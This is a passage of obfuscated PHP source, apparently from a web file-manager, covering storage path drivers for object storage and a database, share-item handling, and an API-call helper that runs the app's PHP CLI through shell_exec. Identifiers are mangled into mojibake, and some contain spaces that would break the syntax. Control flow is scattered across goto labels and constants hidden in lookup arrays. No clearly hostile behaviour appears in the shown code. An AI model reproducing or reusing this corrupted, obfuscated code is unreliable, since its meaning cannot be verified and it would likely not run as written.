¢£Ğñ[$FâŠ¬Ü·‡Ô[405]][$FâŠ¬Ü·‡Ô[994]] = $bÉ›´¯®ñÚ[$a¼é ¢£Ğñ[$FâŠ¬Ü·‡Ô[405]][$FâŠ¬Ü·‡Ô[994]]]; } if ($a¼é ¢£Ğñ[$FâŠ¬Ü·‡Ô[29]] == $FâŠ¬Ü·‡Ô[2298] && isset($a¼é ¢£Ğñ[$FâŠ¬Ü·‡Ô[405]][$FâŠ¬Ü·‡Ô[369]])) { $a¼é ¢£Ğñ[$FâŠ¬Ü·‡Ô[405]][$FâŠ¬Ü·‡Ô[369]] = $bÉ›´¯®ñÚ[$a¼é ¢£Ğñ[$FâŠ¬Ü·‡Ô[405]][$FâŠ¬Ü·‡Ô[369]]]; } $a¼é ¢£Ğñ[$FâŠ¬Ü·‡Ô[391]] = $bÉ›´¯®ñÚ[$a¼é ¢£Ğñ[$FâŠ¬Ü·‡Ô[369]]]; $a¼é ¢£Ğñ[$FâŠ¬Ü·‡Ô[2303]] = $bÉ›´¯®ñÚ[$a¼é ¢£Ğñ[$FâŠ¬Ü·‡Ô[2290]]]; if ($a¼é ¢£Ğñ[$FâŠ¬Ü·‡Ô[29]] == $FâŠ¬Ü·‡Ô[2060]) { $a¼é ¢£Ğñ[$FâŠ¬Ü·‡Ô[2303]] = $a¼é ¢£Ğñ[$FâŠ¬Ü·‡Ô[391]]; $a¼é ¢£Ğñ[$FâŠ¬Ü·‡Ô[2290]] = $a¼é ¢£Ğñ[$FâŠ¬Ü·‡Ô[2303]][$FâŠ¬Ü·‡Ô[369]]; $a¼é ¢£Ğñ[$FâŠ¬Ü·‡Ô[391]] = !1; $a¼é ¢£Ğñ[$FâŠ¬Ü·‡Ô[369]] = $FâŠ¬Ü·‡Ô[33]; } $a¼é ¢£Ğñ[$FâŠ¬Ü·‡Ô[2246]] = $cÙ¯¬ƒóç[$a¼é ¢£Ğñ[$FâŠ¬Ü·‡Ô[1423]]]; } $cŞç©êÃ†[$FâŠ¬Ü·‡Ô[354]] = $Eªñ¿½ÅÙ; goto f¢à­×µÑ; BêÙÓÉÜªë: } public function removeBySource($Bñ£²‰îˆ÷) { $D‡²Å¢™±¥ = array($_SERVER[í™][383] => $Bñ£²‰îˆ÷); $this->where($D‡²Å¢™±¥)->remove(); } } goto eåîêİø¡Ğ; c¶Ò¯¦ÈºÑ: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($eÒ²‚ÇŒÂˆ) { parent::__construct($eÒ²‚ÇŒÂˆ); $this->signatureVersion($_SERVER[í™][200]); } public function uploadFormData($EÌÓ¼õğšÊ, $eæâ‰ Ê‡Ü = 3600) { goto aå‚ë’ˆ‰ß; aå‚ë’ˆ‰ß: $c˜ÀÅÍ¯Ó =& $_SERVER[í™]; $C±Üä©ßæÙ = $c˜ÀÅÍ¯Ó[185]; $aÌ÷ƒ…¹œ´ = $c˜ÀÅÍ¯Ó[218]; goto fÛ©ˆŸìÒ; fÛ©ˆŸìÒ: $aÁô¶³Ò™ç = $c˜ÀÅÍ¯Ó[1086]; $ašäª†å–Ç = gmdate($c˜ÀÅÍ¯Ó[1087], time() + $eæâ‰ Ê‡Ü); $Bˆ¿öÌ‡ = (string) time() . $c˜ÀÅÍ¯Ó[67] . (string) (time() + $eæâ‰ Ê‡Ü); goto cµ…Ÿª‹Õ; cŠíò‡Æ‘î: return $Cï§ß¹ÖÂ¨; goto A³œÄ‡Øµç; e«óÄÍ‹Å: $a÷ ƒ©°æÙ = sha1($BÔĞ»ã±¨¸); $e‡ÉÓ÷¦¬ = hash_hmac($c˜ÀÅÍ¯Ó[218], $a÷ ƒ©°æÙ, $fÜË£õæ¬ä); $Cï§ß¹ÖÂ¨ = array($c˜ÀÅÍ¯Ó[1090] => $C±Üä©ßæÙ, $c˜ÀÅÍ¯Ó[1094] => $aÁô¶³Ò™ç, $c˜ÀÅÍ¯Ó[1098] => base64_encode($BÔĞ»ã±¨¸), $c˜ÀÅÍ¯Ó[1095] => $aÌ÷ƒ…¹œ´, $c˜ÀÅÍ¯Ó[1096] => $this->accessKey, $c˜ÀÅÍ¯Ó[1099] => $Bˆ¿öÌ‡, $c˜ÀÅÍ¯Ó[1100] => $e‡ÉÓ÷¦¬, $c˜ÀÅÍ¯Ó[169] => $this->getHost()); goto cŠíò‡Æ‘î; cµ…Ÿª‹Õ: $BÔĞ»ã±¨¸ = array($c˜ÀÅÍ¯Ó[1088] => $ašäª†å–Ç, $c˜ÀÅÍ¯Ó[1089] => array(array($c˜ÀÅÍ¯Ó[1090] => $C±Üä©ßæÙ), array($c˜ÀÅÍ¯Ó[1091] => $this->bucket), array($c˜ÀÅÍ¯Ó[1092], $c˜ÀÅÍ¯Ó[1093], $c˜ÀÅÍ¯Ó[33]), array($c˜ÀÅÍ¯Ó[1094] => $aÁô¶³Ò™ç), array($c˜ÀÅÍ¯Ó[1095] => $aÌ÷ƒ…¹œ´), array($c˜ÀÅÍ¯Ó[1096] => $this->accessKey), array($c˜ÀÅÍ¯Ó[1097] => $Bˆ¿öÌ‡))); $BÔĞ»ã±¨¸ = json_encode($BÔĞ»ã±¨¸); $fÜË£õæ¬ä = hash_hmac($c˜ÀÅÍ¯Ó[218], $Bˆ¿öÌ‡, $this->secret); goto e«óÄÍ‹Å; A³œÄ‡Øµç: } public function fileOutLink($aÒŒ¶£®çÓ) { $e¾Ùã‹¬ Ö =& $_SERVER[í™]; if (substr($aÒŒ¶£®çÓ, 0, 7) == $e¾Ùã‹¬ Ö[1101]) { $aÒŒ¶£®çÓ = $e¾Ùã‹¬ Ö[1102] . substr($aÒŒ¶£®çÓ, 7); } header($e¾Ùã‹¬ Ö[156] . $aÒŒ¶£®çÓ); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($eê„•”®öÍ) { $this->pathParse = $eê„•”®öÍ; $this->model = Model($_SERVER[í™][1103]); } public function getPath($dí†ëÖ­«À) { return trim($dí†ëÖ­«À, $_SERVER[í™][8]); } public function pathFather($B‡’Ú¢Àª±) { $bœÙµæ®ïÙ = $this->parse($B‡’Ú¢Àª±); $bœÙµæ®ïÙ = $this->infoSimple($B‡’Ú¢Àª±); return $bœÙµæ®ïÙ ? $bœÙµæ®ïÙ[$_SERVER[í™][463]] : !1; } public function getPathName($Dééíœğ¤) { $dÔæ³Æ¶èÓ = $this->infoSimple($Dééíœğ¤); return $dÔæ³Æ¶èÓ ? $dÔæ³Æ¶èÓ[$_SERVER[í™][28]] : !1; } public function getPathOuter($A·éã—êã) { if (!$A·éã—êã) { return $A·éã—êã; } $D×†¦³· = $this->parse($A·éã—êã); return KodIO::make($D×†¦³·[$_SERVER[í™][367]]); } public function copyFolderFromIO($a§˜¾ƒØ†, $ağ×ğ„Ë, $EŞğÍœí, $däø„Íí, $A½¦à “ˆ) { $bËÛÜå—œ = $this->model->copyFolderFromIO($a§˜¾ƒØ†, $ağ×ğ„Ë, $EŞğÍœí, $däø„Íí, $A½¦à “ˆ); return KodIO::make($bËÛÜå—œ); } public function isParentOf($D›Ñ‘¸§àÏ, $BÉëŒ‹âÔ) { return $this->model->isParentOf($D›Ñ‘¸§àÏ, $BÉëŒ‹âÔ); } public function mkfile($aÙ¿óéÑ, $D¤÷ô«í© = '', $c¡ÛÜ¯ÛËš = REPEAT_RENAME) { $aò´àİÊñ… =& $_SERVER[í™]; $eÆ›šŞƒŸ = $this->parse($aÙ¿óéÑ); $aÙ¿óéÑ = $eÆ›šŞƒŸ[$aò´àİÊñ…[367]]; for ($D¡†½Ã¾¹ = 0; $D¡†½Ã¾¹ < count($eÆ›šŞƒŸ[$aò´àİÊñ…[1104]]); $D¡†½Ã¾¹++) { $Cå´‰Òãª¿ = $eÆ›šŞƒŸ[$aò´àİÊñ…[1104]][$D¡†½Ã¾¹]; if ($D¡†½Ã¾¹ == count($eÆ›šŞƒŸ[$aò´àİÊñ…[1104]]) - 1) { $aÙ¿óéÑ = $this->model->mkfile($aÙ¿óéÑ, $Cå´‰Òãª¿, $D¤÷ô«í©, $c¡ÛÜ¯ÛËš); break; } $aÙ¿óéÑ = $this->model->mkdir($aÙ¿óéÑ, $Cå´‰Òãª¿, REPEAT_SKIP); } return $this->getPathOuter($aÙ¿óéÑ); } public function mkdir($A¹‡ÉÑ”ªÊ, $aÚŞå— ‰ = REPEAT_SKIP) { $fÌøÉ¨££Ó =& $_SERVER[í™]; $c¼ÜŒéÙœì = $this->parse($A¹‡ÉÑ”ªÊ); $A¹‡ÉÑ”ªÊ = $c¼ÜŒéÙœì[$fÌøÉ¨££Ó[367]]; for ($C”ˆºÌ´çÄ = 0; $C”ˆºÌ´çÄ < count($c¼ÜŒéÙœì[$fÌøÉ¨££Ó[1104]]); $C”ˆºÌ´çÄ++) { $eæï‘˜ÕÖ„ = $c¼ÜŒéÙœì[$fÌøÉ¨££Ó[1104]][$C”ˆºÌ´çÄ]; $A¹‡ÉÑ”ªÊ = $this->model->mkdir($A¹‡ÉÑ”ªÊ, $eæï‘˜ÕÖ„, $aÚŞå— ‰); } return $this->getPathOuter($A¹‡ÉÑ”ªÊ); } public function copyFile($CğÄÊ×âÁô, $Eãâ¬ÁÈ«›, $e‰Œ˜ÄœÇ¬ = REPEAT_REPLACE) { $C†ÍºÏ»äŠ =& $_SERVER[í™]; $D†ñá‹³¶à = $this->parse($Eãâ¬ÁÈ«›); $cÙµË¿ÛÛÅ = $this->model->copy($CğÄÊ×âÁô, $D†ñá‹³¶à[$C†ÍºÏ»äŠ[367]], $e‰Œ˜ÄœÇ¬, $D†ñá‹³¶à[$C†ÍºÏ»äŠ[75]]); return $cÙµË¿ÛÛÅ ? $this->getPathOuter($cÙµË¿ÛÛÅ) : !1; } public function moveFile($a‡ßíÁ”õ§, $Aòø„œ‰’Ò, $D„‚…¸çˆ = REPEAT_REPLACE) { $eåó­ˆ¬Ì =& $_SERVER[í™]; $Câ»„ñÉ—‹ = $this->parse($Aòø„œ‰’Ò); $aÈ…¡‡ºœé = $this->model->move($a‡ßíÁ”õ§, $Câ»„ñÉ—‹[$eåó­ˆ¬Ì[367]], $D„‚…¸çˆ, $Câ»„ñÉ—‹[$eåó­ˆ¬Ì[75]]); return $aÈ…¡‡ºœé ? $this->getPathOuter($aÈ…¡‡ºœé) : !1; } public function copy($fÌÀ³ÊÖ—, $dô½õÖä, $bÎ¡àÍÁâ† = REPEAT_REPLACE) { $E‡ğ¯³Ú§Â = $this->parse($dô½õÖä); $A²šÎê÷æ = $this->model->copy($fÌÀ³ÊÖ—, $E‡ğ¯³Ú§Â[$_SERVER[í™][367]], $bÎ¡àÍÁâ†); return $A²šÎê÷æ ? $this->getPathOuter($A²šÎê÷æ) : !1; } public function moveSameAllow() { } public function move($fÄª’æ¸¬», $dˆÔ­§ô, $Eİ²‹†ğ°ê = REPEAT_REPLACE) { $E¯¡Œ„Ş»Ù = $this->parse($dˆÔ­§ô); $cÚ‡à‡ßÙ¨ = $this->model->move($fÄª’æ¸¬», $E¯¡Œ„Ş»Ù[$_SERVER[í™][367]], $Eİ²‹†ğ°ê); return $cÚ‡à‡ßÙ¨ ? $this->getPathOuter($cÚ‡à‡ßÙ¨) : !1; } public function remove($F‘“ÙéÕÛ”, $aøô„ç¶É» = true) { return $this->model->remove($F‘“ÙéÕÛ”, $aøô„ç¶É»); } public function rename($e‚ÇŠ¸¼î®, $cù‘š‘ †Š) { $c¸Ç¨‡øæÄ = $this->model->rename($e‚ÇŠ¸¼î®, $cù‘š‘ †Š); return $c¸Ç¨‡øæÄ ? $this->getPathOuter($e‚ÇŠ¸¼î®) : $c¸Ç¨‡øæÄ; } public function size($Aõ°…œ«Îà) { $AÎñå–Ùœò = $this->infoSimple($Aõ°…œ«Îà); return $AÎñå–Ùœò ? $AÎñå–Ùœò[$_SERVER[í™][77]] : 0; } public function infoSimple($c˜æ¹á®ï) { return $this->model->sourceInfo($c˜æ¹á®ï); } public function info($D¨…‡Ü¥È) { return $this->infoParse($D¨…‡Ü¥È); } public function infoAuth($DŸ‰‹Şøï) { return $this->infoParse($DŸ‰‹Şøï, !1, !0); } public function infoWithChildren($b“šÀ›·‘©) { return $this->infoParse($b“šÀ›·‘©, !0); } protected function infoParse($E¬½Çã•©¼, $dõ§ÚªÜì† = false, $DĞÄî¡ø—¥ = false) { if (!$dõ§ÚªÜì†) { return $this->model->pathInfo($E¬½Çã•©¼, $DĞÄî¡ø—¥); } return $this->model->pathInfoMore($E¬½Çã•©¼); } public function infoFull($dˆéòß§Å¹) { $DÁªñ¶¹Öô =& $_SERVER[í™]; $f‘Š•Æ¯ã… = explode($DÁªñ¶¹Öô[8], $dˆéòß§Å¹); $b¬ŒÉß¦›Î = implode($DÁªñ¶¹Öô[8], array_splice($f‘Š•Æ¯ã…, 1)); return $this->model->pathInfoByPath($f‘Š•Æ¯ã…[0], $b¬ŒÉß¦›Î); } public function hashSimple($CáË·“áÜÓ) { $f«—µÃí»Ù =& $_SERVER[í™]; $B¼Õ«×öóÕ = $this->infoWithChildren($CáË·“áÜÓ); return $B¼Õ«×öóÕ[$f«—µÃí»Ù[162]][$f«—µÃí»Ù[164]]; } public function hashMd5($CĞ²­„Ÿ®¾) { $d‘Í˜Áƒ¹› =& $_SERVER[í™]; $d¸ÃÙ½í = $this->infoWithChildren($CĞ²­„Ÿ®¾); return $d¸ÃÙ½í[$d‘Í˜Áƒ¹›[162]][$d‘Í˜Áƒ¹›[163]]; } public function exist($D«Ÿùˆà‰‹) { $a‹‹î®²Úé =& $_SERVER[í™]; $eÑóá›øîô = $this->parse($D«Ÿùˆà‰‹); if (!$eÑóá›øîô[$a‹‹î®²Úé[75]]) { return $this->isFile($D«Ÿùˆà‰‹) || $this->isFolder($D«Ÿùˆà‰‹); } $dŠ¾›ŸÎĞ = array($a‹‹î®²Úé[368] => $eÑóá›øîô[$a‹‹î®²Úé[367]], $a‹‹î®²Úé[28] => $eÑóá›øîô[$a‹‹î®²Úé[75]]); $a»»šâã— = $this->model->where($dŠ¾›ŸÎĞ)->find(); return $a»»šâã— ? !0 : !1; } public function isFile($BÊÊ³¡ó»™) { $C†ªººˆ­µ =& $_SERVER[í™]; $aá²ëŒàÀ = $this->infoSimple($BÊÊ³¡ó»™); return $aá²ëŒàÀ && $aá²ëŒàÀ[$C†ªººˆ­µ[370]] == $C†ªººˆ­µ[83] ? !1 : !0; } public function isFolder($F±Æ¿µäà±) { $FÇÖòÀ¹‡ =& $_SERVER[í™]; $E™Ìó‹Ä–Ø = $this->infoSimple($F±Æ¿µäà±); return $E™Ìó‹Ä–Ø && $E™Ìó‹Ä–Ø[$FÇÖòÀ¹‡[370]] == $FÇÖòÀ¹‡[83] ? !0 : !1; } public function listPath($E½¿Ç¶•‘İ, $bİø™Üöš = false) { $C³å°Ó»ö¸ =& $_SERVER[í™]; if ($E½¿Ç¶•‘İ == $C³å°Ó»ö¸[33]) { return !1; } $CØ»†š³¼ = array($C³å°Ó»ö¸[368] => $E½¿Ç¶•‘İ); if ($bİø™Üöš) { return $this->model->listSource($CØ»†š³¼, -1); } return $this->model->listSource($CØ»†š³¼); } public function has($B×Û…²ç¾Á, $C¶¢¨¬òô = false, $D…ÂÇ†“ó² = null) { $D§ŒÀ¨ìÃ„ =& $_SERVER[í™]; $AÛšöìÔ£ = $this->infoWithChildren($B×Û…²ç¾Á); if ($C¶¢¨¬òô) { return array($D§ŒÀ¨ìÃ„[192] => $AÛšöìÔ£[$D§ŒÀ¨ìÃ„[192]], $D§ŒÀ¨ìÃ„[191] => $AÛšöìÔ£[$D§ŒÀ¨ìÃ„[191]]); } return $D…ÂÇ†“ó² ? $AÛšöìÔ£[$D§ŒÀ¨ìÃ„[192]] : $AÛšöìÔ£[$D§ŒÀ¨ìÃ„[191]]; } public function listAll($dïƒÔâ“‰) { $E–»ïİÖà» = IO::info($this->pathParse[$_SERVER[í™][75]]); if (!$E–»ïİÖà») { return array(); } return $this->model->listAll($dïƒÔâ“‰); } public function getContent($Aª‚î‡äáÛ) { return $this->model->getContent($Aª‚î‡äáÛ); } public function setContent($CëÕİÀî—œ, $a¶Ä¹òå©Ö = '') { return $this->model->setContent($CëÕİÀî—œ, $a¶Ä¹òå©Ö); } public function fileSubstr($d¤‡­Ÿ¹÷, $AÜ¹†Äåí, $F‘ùÑ¤ŸÅ) { return $this->model->fileSubstr($d¤‡­Ÿ¹÷, $AÜ¹†Äåí, $F‘ùÑ¤ŸÅ); } public function download($DËñÌ¬ã‘­, $cßµäÓ±‘‰ = '') { $B°«áõÀ×Î = get_path_father($cßµäÓ±‘‰); $fÂ•ö­–óÁ = get_path_this($cßµäÓ±‘‰); $BìŞ»øÖ = $this->model->fileInfoGet($DËñÌ¬ã‘­); $fƒø…Èõğø = IO::copy($BìŞ»øÖ[$_SERVER[í™][75]], $B°«áõÀ×Î, !1, $fÂ•ö­–óÁ); return $fƒø…Èõğø; } public function setModifyTime($cÌ•¼İ¢, $fç“ÚÂîÑ = '') { $this->model->metaSet($cÌ•¼İ¢, $_SERVER[í™][1105], $fç“ÚÂîÑ); } public function upload($d„÷¡ª–œ, $dÜ±ÈáàæÕ, $dŠòŸœğªË = false, $F‹ÆæÆÖ£± = REPEAT_REPLACE) { $AÏ»Ğ¶È¿ô =& $_SERVER[í™]; $Cšù…ñè¹ = $this->parse($d„÷¡ª–œ); $bÓ´œàÔ¼ = $this->model->addFile($Cšù…ñè¹[$AÏ»Ğ¶È¿ô[367]], $dÜ±ÈáàæÕ, $Cšù…ñè¹[$AÏ»Ğ¶È¿ô[75]], $dŠòŸœğªË, $F‹ÆæÆÖ£±); return $this->getPathOuter($bÓ´œàÔ¼); } public function uploadFileByID($fš¢¥õ’ø, $A‘ª¿ºÕ“, $F³Ëâôµ²ì) { $f¬Î¹ÈñàÕ =& $_SERVER[í™]; $a’øÇÖŞÅ = $this->parse($fš¢¥õ’ø); $Bƒİ Å‘° = $this->model->addFileByFileID($a’øÇÖŞÅ[$f¬Î¹ÈñàÕ[367]], $A‘ª¿ºÕ“, $a’øÇÖŞÅ[$f¬Î¹ÈñàÕ[75]], $F³Ëâôµ²ì); return $this->getPathOuter($Bƒİ Å‘°); } public function addFileByRemote($cÄ‘Ë£¨, $aÃµ¨‚ç£§, $B…ŸàÜõ–Û = array(), $D¤¼ëÑÀ’ê = '', $FêÇ¶¥) { $Bë¤ÚŠ…Ê =& $_SERVER[í™]; $A®‡÷½™± = $this->parse($cÄ‘Ë£¨); $D¤¼ëÑÀ’ê = empty($D¤¼ëÑÀ’ê) ? $A®‡÷½™±[$Bë¤ÚŠ…Ê[75]] : $D¤¼ëÑÀ’ê; $fµ¤ìÏŒ® = $this->model->addFileByRemote($A®‡÷½™±[$Bë¤ÚŠ…Ê[367]], $aÃµ¨‚ç£§, $D¤¼ëÑÀ’ê, $B…ŸàÜõ–Û, $FêÇ¶¥); return $this->getPathOuter($fµ¤ìÏŒ®); } public function uploadLink($eäƒ¿Ì°œ—, $e¡ÌÔ‚¢ = 0) { $F‘¶²ç³Ôæ =& $_SERVER[í™]; $CÁŸÌãßØ© = $this->parse($eäƒ¿Ì°œ—); $eäƒ¿Ì°œ— = Model($F‘¶²ç³Ôæ[546])->createFileName($CÁŸÌãßØ©[$F‘¶²ç³Ôæ[75]]); $C¾çÛ®«¯¹ = IO::uploadLink($eäƒ¿Ì°œ—, $e¡ÌÔ‚¢); return $C¾çÛ®«¯¹; } public function fileNameAuto($E˜øˆº¶°…, $B¸¼Éìİµó, $FïÆ‰ = REPEAT_REPLACE, $f®–Â˜ªçÅ = false) { return $this->model->fileNameAuto($E˜øˆº¶°…, $B¸¼Éìİµó, $FïÆ‰, $f®–Â˜ªçÅ); } public function fileNameExist($EÉÄ¯œÍ¬, $f¡ÃõŒÖòÛ) { return $this->model->fileNameExist($EÉÄ¯œÍ¬, $f¡ÃõŒÖòÛ); } protected function _fileOut($ešğˆÑ…¯, $EŞ Ê´¾œ = false, $e¦­ø‚‰Óé = false, $eĞ·ª¼¨ò’ = '', $aìÜ§¿åÏ = false) { goto cƒâ“Œ®¢‘; Dªà™‹: $B¾ÔŸÒå‹Ê = $this->model->fileInfoGet($ešğˆÑ…¯); $eĞ·ª¼¨ò’ = $B¾ÔŸÒå‹Ê[$däÛ •Íƒ[163]] ? $B¾ÔŸÒå‹Ê[$däÛ •Íƒ[163]] : $eĞ·ª¼¨ò’; $dÉø¬¥ĞŸ„ = isset($GLOBALS[$däÛ •Íƒ[1107]]) ? $GLOBALS[$däÛ •Íƒ[1107]] : $díèƒÒÍØ[$däÛ •Íƒ[28]]; goto BíÆ§ñ¼ƒ; BíÆ§ñ¼ƒ: if ($aìÜ§¿åÏ) { return IO::fileOutServer($B¾ÔŸÒå‹Ê[$däÛ •Íƒ[75]], $EŞ Ê´¾œ, $dÉø¬¥ĞŸ„, $eĞ·ª¼¨ò’); } IO::fileOut($B¾ÔŸÒå‹Ê[$däÛ •Íƒ[75]], $EŞ Ê´¾œ, $dÉø¬¥ĞŸ„, $eĞ·ª¼¨ò’); goto f¥É­èÚæ„; cƒâ“Œ®¢‘: $däÛ •Íƒ =& $_SERVER[í™]; $díèƒÒÍØ = $this->model->sourceInfo($ešğˆÑ…¯); if ($díèƒÒÍØ[$däÛ •Íƒ[370]] == $däÛ •Íƒ[83]) { header($däÛ •Íƒ[1106]); die; } goto Dªà™‹; f¥É­èÚæ„: } public function fileOut($cÂÙ“ä¨—, $Bù©åˆÖô = false, $b‘¯ŞÕ÷ÇØ = false, $c‰Ê»šÂ¹‡ = '') { $this->_fileOut($cÂÙ“ä¨—, $Bù©åˆÖô, $b‘¯ŞÕ÷ÇØ, $c‰Ê»šÂ¹‡); } public function fileOutServer($BèêÉ•…, $A‰Œ¼Ñ‚¤† = false, $EˆêíÅòÜ = false, $CŞÙÜõ‘æ = '') { $this->_fileOut($BèêÉ•…, $A‰Œ¼Ñ‚¤†, $EˆêíÅòÜ, $CŞÙÜõ‘æ, !0); } protected function _fileOutImage($dÍİÉÖŒğ, $DøÒ‡ñ·Û‘ = 250) { $D®®’İÎ‰ =& $_SERVER[í™]; $E«ĞÖ‡º…Õ = $this->model->sourceInfo($dÍİÉÖŒğ); if ($E«ĞÖ‡º…Õ[$D®®’İÎ‰[370]] == $D®®’İÎ‰[83]) { show_json($D®®’İÎ‰[1108] . $dÍİÉÖŒğ, !1); } $GLOBALS[$D®®’İÎ‰[1107]] = $E«ĞÖ‡º…Õ[$D®®’İÎ‰[28]]; $DÃ‰ß–‘ “ = $this->model->fileInfoGet($dÍİÉÖŒğ); IO::fileOutImage($DÃ‰ß–‘ “[$D®®’İÎ‰[75]], $DøÒ‡ñ·Û‘); } public function fileOutImage($CÕìª‹î¶Î, $DÚŸÅÃå« = 250) { $this->_fileOutImage($CÕìª‹î¶Î, $DÚŸÅÃå«); } public function fileOutImageServer($a”ç’–øÏ¥, $eö†£®¾¯§ = 250) { $this->_fileOutImage($a”ç’–øÏ¥, $eö†£®¾¯§); } public function link($DÉøäëè, $e¤ÇİÙÔ = '') { $CÒˆ‚ñî§® = $this->model->fileInfoGet($DÉøäëè); return IO::link($CÒˆ‚ñî§®[$_SERVER[í™][75]], $e¤ÇİÙÔ); } protected function parse($aÆÑ‰õªãĞ) { $dÍ…ÏÍ›ÑÚ =& $_SERVER[í™]; if (strstr($aÆÑ‰õªãĞ, $dÍ…ÏÍ›ÑÚ[8]) === !1) { return array($dÍ…ÏÍ›ÑÚ[385] => intval($aÆÑ‰õªãĞ), $dÍ…ÏÍ›ÑÚ[75] => $dÍ…ÏÍ›ÑÚ[33], $dÍ…ÏÍ›ÑÚ[1104] => array()); } $Fœõ¬°íùê = explode($dÍ…ÏÍ›ÑÚ[8], trim($aÆÑ‰õªãĞ, $dÍ…ÏÍ›ÑÚ[8])); if (count($Fœõ¬°íùê) < 2) { show_tips($aÆÑ‰õªãĞ . $dÍ…ÏÍ›ÑÚ[1109]); } return array($dÍ…ÏÍ›ÑÚ[385] => intval($Fœõ¬°íùê[0]), $dÍ…ÏÍ›ÑÚ[75] => $Fœõ¬°íùê[1], $dÍ…ÏÍ›ÑÚ[1104] => array_slice($Fœõ¬°íùê, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($E‚¼‡íç‘â) { $this->pathParse = $E‚¼‡íç‘â; $this->model = Model($_SERVER[í™][1103]); } public function getPathOuter($EŸÎ™–®‰) { $cùÏÔ»ğÙ =& $_SERVER[í™]; if (!$EŸÎ™–®‰) { return $EŸÎ™–®‰; } $fÙ¼’ùÒË° = $this->parse($EŸÎ™–®‰); return trim(KodIO::makeShare($this->pathParse[$cùÏÔ»ğÙ[367]], $fÙ¼’ùÒË°[$cùÏÔ»ğÙ[367]]), $cùÏÔ»ğÙ[8]); } protected function infoParse($cÇ·£ê‹‚, $A§•¬Å®òÑ = false, $b¢Ğ£Ø’¹ä = false) { $Dòí§Êõà´ =& $_SERVER[í™]; $C¹ºƒå¡è = $this->pathParse[$Dòí§Êõà´[367]]; $Eä³‰ƒ»ë® = trim($this->pathParse[$Dòí§Êõà´[998]], $Dòí§Êõà´[8]); return Action($Dòí§Êõà´[1110])->sharePathInfo($C¹ºƒå¡è, $Eä³‰ƒ»ë®); } public function infoFull($EŞò¤›…’Ş) { $fÅØéÇÃ˜· =& $_SERVER[í™]; $D£³‰œÅ˜– = explode($fÅØéÇÃ˜·[8], trim($EŞò¤›…’Ş, $fÅØéÇÃ˜·[8])); if (count($D£³‰œÅ˜–) > 1) { $e“¦’ „Şä = implode($fÅØéÇÃ˜·[8], array_splice($D£³‰œÅ˜–, 1)); $fš†÷‘÷ÖÄ = $this->model->pathInfoByPath($D£³‰œÅ˜–[0], $e“¦’ „Şä); if (!$fš†÷‘÷ÖÄ) { return !1; } $this->pathParse[$fÅØéÇÃ˜·[998]] = $fš†÷‘÷ÖÄ[$fÅØéÇÃ˜·[369]]; } return $this->infoParse($EŞò¤›…’Ş); } public function listAll($b…±‘Á¯Öë) { goto b¬ïª³ğ“É; dÎàÌÓ‹‹§: foreach ($cˆÈÚ ĞÌ as &$f„Ó¹ø†Ÿà) { check_abort(); $f„Ó¹ø†Ÿà[$d…Õ«Ùùö¶[391]] = $e¤ÎŠƒ¼ˆƒ->_shareItemeParse($f„Ó¹ø†Ÿà[$d…Õ«Ùùö¶[391]], $E´ÏÜïÑ); } return $cˆÈÚ ĞÌ; goto cÇï‡©›·…; a­ˆÌÎàº: $cˆÈÚ ĞÌ = $this->model->listAll($b…±‘Á¯Öë); $E´ÏÜïÑ = Model($d…Õ«Ùùö¶[538])->getInfo($dğÆ„ºŒòŞ[$d…Õ«Ùùö¶[441]]); $e¤ÎŠƒ¼ˆƒ = Action($d…Õ«Ùùö¶[1110]); goto dÎàÌÓ‹‹§; b¬ïª³ğ“É: $d…Õ«Ùùö¶ =& $_SERVER[í™]; $dğÆ„ºŒòŞ = IO::info($this->pathParse[$d…Õ«Ùùö¶[75]]); if (!$dğÆ„ºŒòŞ) { return array(); } goto a­ˆÌÎàº; cÇï‡©›·…: } } goto b®¹Üî®®´; E¿‹À…†Œ´: define($_SERVER[í™][1921], 1); define($_SERVER[í™][1922], 2); define($_SERVER[í™][1923], 3); goto a„‘áó©Äî; Dëé¼×¨Á: define($_SERVER[í™][227], 2); define($_SERVER[í™][228], 3); define($_SERVER[í™][229], 1); goto Cµ·Ì«˜ËÂ; Fë—éšëÃ: function ActionCall($aŸ” “ã‘â) { $d˜ŞĞé¬šÚ = array_slice(func_get_args(), 1); return ActionApply($aŸ” “ã‘â, $d˜ŞĞé¬šÚ); } function ActionCallApi($cĞ×ßê“Â‘, $AÅ¤ÀÛ˜ì™ = '') { goto cÅÊ´‰­ÅŸ; a¯›¸Ï½‘Æ: $bÜ„ÍíªŒî = json_decode($fïÛ’çßÑ—, !0); $A·ØºŠÎÃ = is_array($bÜ„ÍíªŒî) ? $bÜ„ÍíªŒî : array($FÏ®—¬Š¼[29] => null, $FÏ®—¬Š¼[30] => $fïÛ’çßÑ—); if (!$bÜ„ÍíªŒî) { echo $fïÛ’çßÑ—; } goto CµÅõÆ¾’„; cÅÊ´‰­ÅŸ: $FÏ®—¬Š¼ =& $_SERVER[ñâ]; $a¬é™Ë˜ÑÖ = $AÅ¤ÀÛ˜ì™; if (is_array($AÅ¤ÀÛ˜ì™)) { $a¬é™Ë˜ÑÖ = $FÏ®—¬Š¼[16]; foreach ($AÅ¤ÀÛ˜ì™ as $f­ğôÁ´¯ => $aÃĞõÙÄˆí) { $aÃĞõÙÄˆí = is_array($aÃĞõÙÄˆí) ? json_encode($aÃĞõÙÄˆí) : $aÃĞõÙÄˆí; $aÃĞõÙÄˆí = is_bool($aÃĞõÙÄˆí) ? intval($aÃĞõÙÄˆí) : $aÃĞõÙÄˆí; $a¬é™Ë˜ÑÖ .= $FÏ®—¬Š¼[17] . $f­ğôÁ´¯ . $FÏ®—¬Š¼[18] . rawurlencode($aÃĞõÙÄˆí); } } goto fØÓ ŒÖë»; fëŠ‹¤‡‘Í: $b¶³ïÄÀçì = phpBinCommand(); if ($b¶³ïÄÀçì && function_exists($FÏ®—¬Š¼[21])) { $b§ƒøå´Ö¹ = $b¶³ïÄÀçì . $FÏ®—¬Š¼[22] . BASIC_PATH . $FÏ®—¬Š¼[23] . escapeshellarg($cĞ×ßê“Â‘); $fïÛ’çßÑ— = shell_exec($b§ƒøå´Ö¹); } if (!$fïÛ’çßÑ—) { $EÆ³èª¼ºÍ = stream_context_create(array($FÏ®—¬Š¼[24] => array($FÏ®—¬Š¼[25] => 20, $FÏ®—¬Š¼[26] => $FÏ®—¬Š¼[27]))); $fïÛ’çßÑ— = file_get_contents(APP_HOST . $FÏ®—¬Š¼[28] . $cĞ×ßê“Â‘, !1, 